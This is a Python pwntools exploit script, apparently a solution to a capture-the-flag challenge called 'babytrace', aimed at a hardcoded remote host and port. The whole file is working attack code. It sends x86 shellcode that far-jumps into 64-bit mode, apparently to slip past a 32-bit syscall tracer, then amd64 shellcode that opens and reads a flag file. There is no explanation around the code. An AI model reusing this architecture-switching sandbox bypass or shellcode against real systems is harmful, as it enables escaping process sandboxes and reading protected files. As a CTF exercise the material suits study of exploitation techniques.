#!/usr/bin/python
from pwn import *
import sys

HOST = "35.231.236.101"
PORT = 2222

SC1 = """	
	call 0x33:0x804a100
	xor eax, eax
	mov al, 5
	mov ebx, 0x804a132
	xor ecx, ecx
	xor edx, edx
	int 0x80
	"""

SC2 = """	
	xor rax, rax
	mov al, 2
	mov rdi, 0x804a132
	xor rsi, rsi
	xor rdx, rdx
	syscall

	xor rax, rax
	mov al, 0
	xor rdi, rdi
	mov di, 3
	xor rsi, rsi
	mov rsi, 0x804a146
	xor rdx, rdx
	mov dl, 100
	syscall
	
	retf
	"""
def exploit(r):
	r.recvuntil(": ")

	# pass the x86 shellcode
	payload = asm(SC1, os="linux", arch="x86")
	payload += "\x90"*(0x100-0x40-len(payload))

	# pass the amd64 shellcode
	payload += asm(SC2, os="linux", arch="amd64")	

	# pass the flag file to read
	payload += "/home/babytrace/flag\x00"

	r.sendline(payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./babytrace")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = remote("localhost", 6666)
		print util.proc.pidof(r)
		pause()
		exploit(r)
